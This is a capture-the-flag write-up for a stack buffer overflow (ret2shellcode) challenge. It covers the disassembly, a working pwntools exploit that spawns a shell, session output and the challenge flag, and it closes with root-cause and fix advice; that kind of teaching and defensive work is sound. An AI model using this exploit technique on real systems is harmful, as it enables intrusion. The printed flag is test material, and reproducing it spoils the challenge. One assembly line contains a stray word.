# the_hinge_whisper: Writeup

**Category:** Pwn (Stack buffer overflow / ret2shellcode)
**File provided:** `the_hinge_whisper` (ELF 64-bit, dynamically linked, not stripped)

## TL;DR

The binary leaks the stack address of a local buffer, then reads more bytes into
that buffer than it holds. There's no stack canary and the stack is executable
(`GNU_STACK` is `RWE`), so the classic move applies: drop shellcode into the
buffer, overwrite the saved return address with the leaked buffer address, and
let `ret` jump straight into it.

```
HTB{th3_h1ng3_wh1sp3r5_t0_th0s3_wh0_l1st3n_a40cab2eee58fc47361010c6bf60bdcc}
```

---

## 1. Recon

```
$ file the_hinge_whisper
ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped

$ readelf -l the_hinge_whisper | grep GNU_STACK
GNU_STACK  ... RWE
```

Key facts from static analysis / `readelf`:

- **PIE**, but not stripped: symbol names (`service_hatch`, etc.) are intact.
- **No stack canary**: no `__stack_chk_fail` reference, no canary check before
  the function epilogue.
- **`GNU_STACK` is `RWE`**: NX is disabled. The stack is executable.

That combination: executable stack, no canary: is the signature of a
ret2shellcode challenge.

## 2. The vulnerable function

Disassembling `service_hatch()`:

```asm
push   rbp
mov    rbp, rsp
sub    rsp, 0x40statement          ; 64-byte local buffer at [rbp-0x40]

lea    rax, [rbp-0x40]
mov    rsi, rax
lea    rax, [rip+...]              ; "[+] The keyway sits at: %p\n"
mov    rdi, rax
call   printf                      ; printf(fmt, &buf)   <-- LEAK

lea    rax, [rip+...]              ; "[+] Forge your latch-key: "
mov    rdi, rax
call   printf

lea    rax, [rbp-0x40]
mov    rdx, 0x50                   ; read up to 80 bytes
mov    rsi, rax
mov    edi, 0
call   read                        ; read(0, &buf, 0x50)   <-- OVERFLOW
```

Two problems, stacked on top of each other:

1. **Info leak.** Before ever reading input, the function `printf`s the exact
   stack address of its own local buffer via `%p`. No ASLR bypass required: the leak hands us the address directly.
2. **Buffer overflow.** The buffer is 64 bytes (`0x40`), but `read()` accepts
   up to 80 bytes (`0x50`). That's exactly 16 bytes of overflow: just enough
   to overwrite the saved RBP (8 bytes) and the return address (8 bytes), and
   no further (no adjacent variables or canary to worry about).

## 3. Exploit plan

With the buffer's own address in hand and a controllable return address, the
plan is:

1. Fill the 64-byte buffer with shellcode (padded with NOPs).
2. Overwrite the saved RBP with junk (unused).
3. Overwrite the return address with the **leaked buffer address**.
4. On `leave; ret`, execution jumps back into the buffer and runs our
   shellcode directly: no need for a libc leak, no ROP chain, no one-gadget
   hunting.

### Gotcha: shellcode self-corruption

A first attempt using a standard `execve("/bin/sh")` stub (pushes `"/bin/sh"`,
builds `argv` on the stack, syscalls) segfaulted partway through. Inspecting
the crash in a core dump showed execution getting a few instructions in and
then decoding garbage.

The cause: after `leave; ret`, RSP lands only about `0x50` bytes **above** the
start of the buffer. Since stack grows down, a shellcode stub that does
several `push` instructions writes back into memory that overlaps the
buffer: i.e. it overwrites its own not-yet-executed bytes mid-flight,
corrupting itself.

**Fix:** prepend `sub rsp, 0x500` as the very first shellcode instruction,
moving RSP well clear of the buffer before any `push` happens.

```asm
sub rsp, 0x500        ; get RSP out of the blast radius
; ... standard execve("/bin/sh") shellcode follows ...
```

## 4. Final exploit

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

p = remote(HOST, PORT)

p.recvuntil(b'sits at: ')
addr = int(p.recvline().strip(), 16)
log.info("leaked buffer addr = %#x" % addr)

sc = asm('sub rsp, 0x500') + asm(shellcraft.sh())
assert len(sc) <= 64

payload  = sc.ljust(64, b'\x90')   # shellcode + NOP padding to fill the buffer
payload += b'B' * 8                # saved rbp (garbage, unused)
payload += p64(addr)                # return address -> jump back into buffer

p.sendline(payload)
p.interactive()
```

> Note: on machines without GNU binutils installed locally (e.g. stock macOS),
> `pwntools`' `asm()` can't invoke `as`. The fix is to assemble the shellcode
> once (on any Linux box or in a container) and hardcode the resulting raw
> bytes instead of calling `asm()` at runtime.

## 5. Getting the flag

```
$ python3 exploit.py
[+] Opening connection to <host> on port <port>: Done
[*] leaked buffer addr = 0x7ffd4ac68010
[*] Switching to interactive mode
  [+] Forge your latch-key: $ id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ cat flag.txt
HTB{th3_h1ng3_wh1sp3r5_t0_th0s3_wh0_l1st3n_a40cab2eee58fc47361010c6bf60bdcc}
```

## Root cause summary

| | |
|---|---|
| **Intended vulnerability class** | Stack-based buffer overflow with an unprotected, executable stack. |
| **Root cause** | `service_hatch()` leaks its own local buffer's stack address via `printf("...%p...", &buf)`, then calls `read(0, &buf, 0x50)` on a 64-byte buffer: 16 bytes of guaranteed overflow. |
| **Enabling conditions** | No stack canary; `GNU_STACK` marked `RWE` (NX disabled). |
| **Exploit** | Overwrite saved RBP (junk) and return address (= leaked buffer address) with a 16-byte overflow; place `sub rsp, 0x500` + `execve("/bin/sh")` shellcode in the buffer itself so `ret` jumps straight into it. The `sub rsp` prefix is required because RSP lands close enough to the buffer after `leave; ret` that a push-heavy shellcode would otherwise overwrite its own tail. |
| **Fix** | Add a stack canary (`-fstack-protector`), mark the stack non-executable (`-z noexecstack`), and stop leaking internal addresses via format strings. |
